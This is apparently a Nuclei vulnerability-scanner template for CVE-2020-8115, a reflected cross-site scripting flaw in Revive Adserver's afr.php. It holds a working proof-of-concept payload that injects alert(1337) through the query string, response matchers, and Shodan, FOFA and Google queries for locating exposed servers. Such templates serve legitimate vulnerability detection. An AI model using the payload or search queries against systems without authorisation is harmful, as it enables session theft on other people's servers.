http:
- matchers:
  - part: body
    regex:
    - (?mi)window\.location\.replace\(".*alert\(1337\)
    type: regex
  - negative: true
    part: body
    type: word
    words:
    - window.location.href.indexOf
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/www/delivery/afr.php?refresh=10000&")'',10000000);alert(1337);setTimeout(''alert("'
id: CVE-2020-8115
info:
  author: madrobot,dwisiswant0
  classification:
    cpe: cpe:2.3:a:revive-adserver:revive_adserver:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-8115
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97979
    epss-score: 0.55788
  description: 'Revive Adserver 5.0.3 and prior contains a reflected cross-site scripting
    vulnerability in the publicly accessible afr.php delivery script. In older versions,
    it is possible to steal the session identifier and gain access to the admin interface.
    The query string sent to the www/delivery/afr.php script is printed back without
    proper escaping, allowing an attacker to execute arbitrary JavaScript code on
    the browser of the victim.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement.

    '
  metadata:
    fofa-query:
    - icon_hash=106844876
    - title="revive adserver"
    google-query: intitle:"revive adserver"
    max-request: 1
    product: revive_adserver
    shodan-query:
    - http.title:"revive adserver"
    - http.favicon.hash:106844876
    vendor: revive-adserver
  name: Revive Adserver <=5.0.3 - Cross-Site Scripting
  reference:
  - https://hackerone.com/reports/775693
  - https://www.revive-adserver.com/security/revive-sa-2020-001/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8115
  - https://github.com/Elsfa7-110/kenzer-templates
  - https://github.com/merlinepedra/nuclei-templates
  remediation: There are currently no known exploits. As of 3.2.2, the session identifier
    cannot be accessed as it is stored in an http-only cookie.
  severity: medium
  tags: cve,cve2020,xss,hackerone,revive-adserver,vkev,vuln
